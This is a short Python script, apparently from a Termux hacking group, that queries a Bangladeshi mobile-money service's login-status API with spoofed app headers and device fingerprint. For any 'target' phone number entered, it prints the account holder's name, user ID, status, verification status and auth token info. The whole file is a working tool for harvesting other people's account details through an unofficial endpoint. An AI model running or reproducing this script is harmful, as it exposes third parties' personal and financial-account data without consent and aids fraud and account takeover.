# Coded By Suyaib 
# Termux Education Empire
import requests

def check_user_status(phone_number):
    url = "https://app.mynagad.com:20002/api/user/check-user-status-for-log-in"

    headers = {
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1152",
        "X-KM-DEVICE-FGP": "19DC58E052A91F5B2EB59399AABB2B898CA68CFE780878C0DB69EAAB0553C3C6",
        "X-KM-Accept-language": "en",
        "X-KM-AppCode": "01",
    }

    params = {"msisdn": phone_number}

    try:
        response = requests.get(url, headers=headers, params=params)
        if response.status_code == 200:
            data = response.json()
            print(f"Name: {data.get('name', 'name not found')}")
            print(f"User ID: {data.get('userId', 'user id not found')}")
            print(f"Status: {data.get('status', 'status not found')}")
            print(f"User Type: {data.get('userType', 'user type not found')}")
            print(f"rbBase: {data.get('rbBase', 'rbBase not found')}")
            print(f"Auth Token Info: {data.get('authTokenInfo', 'auth token info not found')}")
            print(f"Verification Status: {data.get('verificationStatus', 'verification status not found')}")
            print(f"Execution Status: {data.get('executionStatus', 'execution status not found')}")
        else:
            print(f"Failed to retrieve data: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

phone_number = input("Enter Target Phone Number :  ")
print("Please wait 1-2 seconds...")
check_user_status(phone_number)
